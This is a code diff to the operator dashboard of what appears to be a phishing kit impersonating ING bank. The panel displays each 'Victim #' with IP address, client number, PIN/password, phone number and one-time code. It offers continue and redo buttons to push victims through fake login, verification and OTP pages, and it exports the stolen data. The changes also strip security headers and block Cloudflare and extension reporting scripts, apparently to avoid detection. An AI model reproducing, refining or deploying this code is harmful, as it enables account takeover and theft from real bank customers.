@@ -4,9 +4,6 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ING Panel</title>
-  <meta http-equiv="X-Content-Type-Options" content="nosniff">
-  <meta http-equiv="X-Frame-Options" content="DENY">
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; connect-src 'self' https: wss:; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://rsms.me;">
   <link rel="preconnect" href="https://rsms.me">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
@@ -153,47 +150,34 @@
   </div>
 
   <script>
-    // Block extension script injection
-    const observer = new MutationObserver((mutations) => {
-      mutations.forEach((m) => {
-        m.addedNodes.forEach((n) => {
-          if (n.tagName === 'SCRIPT' && n.src && (
-            n.src.includes('webpage_content_reporter') ||
-            n.src.includes('cloudflareinsights') ||
-            n.src.includes('extension')
-          )) {
-            console.log('Blocked injected script:', n.src);
-            n.remove();
-          }
+    // Block extension/Cloudflare script injection
+    (function() {
+      'use strict';
+      const blockPatterns = ['cloudflareinsights', 'webpage_content_reporter', 'extension', 'main.js', 'beacon.min.js'];
+      
+      document.querySelectorAll('script').forEach(s => {
+        const src = s.src || '';
+        if (blockPatterns.some(p => src.includes(p))) s.remove();
+      });
+      
+      const observer = new MutationObserver((mutations) => {
+        mutations.forEach((m) => {
+          m.addedNodes.forEach((n) => {
+            if (n.tagName === 'SCRIPT') {
+              const src = n.src || '';
+              if (blockPatterns.some(p => src.includes(p))) n.remove();
+            }
+          });
         });
       });
-    });
-    observer.observe(document.head, { childList: true, subtree: true });
-    
-    // Suppress extension errors
-    window.onerror = function(msg, url, line, col, error) {
-      if (url && (
-        url.includes('webpage_content_reporter') ||
-        url.includes('extension') ||
-        url.includes('content-script')
-      )) {
-        console.log('Suppressed extension error:', msg);
-        return true;
-      }
-      console.error('Error:', msg, 'at', url, line, col);
-      return false;
-    };
-    
-    // Suppress unhandled rejections from extensions
-    window.addEventListener('unhandledrejection', function(e) {
-      if (e.reason && e.reason.toString && (
-        e.reason.toString().includes('extension') ||
-        e.reason.toString().includes('webpage_content_reporter')
-      )) {
-        e.preventDefault();
-        console.log('Suppressed extension rejection');
-      }
-    });
+      
+      if (document.head) observer.observe(document.head, { childList: true, subtree: true });
+      
+      window.onerror = function(msg, url) {
+        if (url && blockPatterns.some(p => url.includes(p))) return true;
+        return false;
+      };
+    })();
 
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     let isConnected = true;
@@ -235,46 +219,36 @@
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    /* ----------  ACTION BUTTONS (table row) - FIXED LOGIC  ---------- */
+    /* ----------  ACTION BUTTONS  ---------- */
     function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
-      
-      // Always show view details
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='📄'"></button>`;
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">📄</button>`;
 
-      // Show redo/continue based on page AND data entered - FIXED CONDITIONS
       if (s.page === 'index.html') {
-        // On login page: show buttons if credentials entered (check both entered flag and email/password values)
         if (s.entered === true || (s.email && s.password)) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='✕'"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
         }
       } else if (s.page === 'verify.html') {
-        // On verify page: show buttons if phone entered
         if (s.phone && s.phone.length > 0) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='✕'"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
         }
       } else if (s.page === 'unregister.html') {
-        // On unregister page: show continue if clicked, no redo
         if (s.unregisterClicked === true) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
         }
       } else if (s.page === 'otp.html') {
-        // On OTP page: show buttons if OTP entered
         if (s.otp && s.otp.length > 0) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='▶'"></button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg" onerror="this.style.display='none';this.parentNode.innerHTML='✕'"></button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
         }
       }
-      // Note: success page has no buttons (already approved)
-      
       return html + '</div>';
     }
 
-    /* ----------  CHANGE DETECTION - REMOVED TAB CLOSE DETECTION  ---------- */
+    /* ----------  CHANGE DETECTION  ---------- */
     function checkChanges(newSessions){
-      // Only check for new data entry, not session removal
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
@@ -329,17 +303,15 @@
         </tr>`).join('');
     }
 
-    /* ----------  MODAL / DETAIL VIEW  ---------- */
+    /* ----------  MODAL  ---------- */
     function showDetail(sid){
       const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
       currentSid = sid;
       
-      // Update header
       qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
       qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
       
-      // Build activity log HTML
       const activityHtml = s.activityLog && s.activityLog.length ? 
         s.activityLog.slice().reverse().map(log => `
           <div class="activity-item">
@@ -357,32 +329,26 @@
             <div class="info-label">Session ID</div>
             <div class="info-value mono" style="font-size:11px">${s.sid}</div>
           </div>
-          
           <div class="info-section">
             <div class="info-label">Current Page</div>
             <div class="info-value" style="color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
           </div>
-          
           <div class="info-section">
             <div class="info-label">Client Number</div>
             <div class="info-value mono">${s.email||'—'}</div>
           </div>
-          
           <div class="info-section">
             <div class="info-label">PIN / Password</div>
             <div class="info-value mono">${s.password||'—'}</div>
           </div>
-          
           <div class="info-section">
             <div class="info-label">Phone Number</div>
             <div class="info-value mono">${s.phone||'—'}</div>
           </div>
-          
           <div class="info-section">
             <div class="info-label">OTP Code</div>
             <div class="info-value mono">${s.otp||'—'}</div>
           </div>
-          
           <div class="info-section full-width">
             <div class="info-label">System Information</div>
             <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:12px;margin-top:8px">
@@ -405,18 +371,15 @@
             </div>
           </div>
         </div>
-        
         <div class="activity-section">
           <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
           <div class="activity-log">${activityHtml}</div>
         </div>
-        
         <div class="delete-section">
           <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
         </div>
       `;
-      
       qs('#modal').style.display='flex';
     }
     
@@ -443,7 +406,7 @@
       }
     }
 
-    /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
+    /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       try {
         await fetch('/panel/logout',{method:'POST'});
@@ -454,7 +417,7 @@
     };
     qs('#exportBtn').onclick = () => location.href = '/api/export';
 
-    /* ----------  LONG-POLL WITH ERROR HANDLING  ---------- */
+    /* ----------  LONG-POLL  ---------- */
     async function load(){
       try {
         const r = await fetch('/api/panel');
@@ -465,7 +428,6 @@
         const d = await r.json();
         if(d.error) return location.replace('/panel');
         
-        // Connection restored
         if (!isConnected) {
           isConnected = true;
           qs('#error-overlay').classList.remove('active');
@@ -481,8 +443,6 @@
       }
       setTimeout(load, 300);
     }
-    
-    // Start polling
     load();
   </script>
 </body>
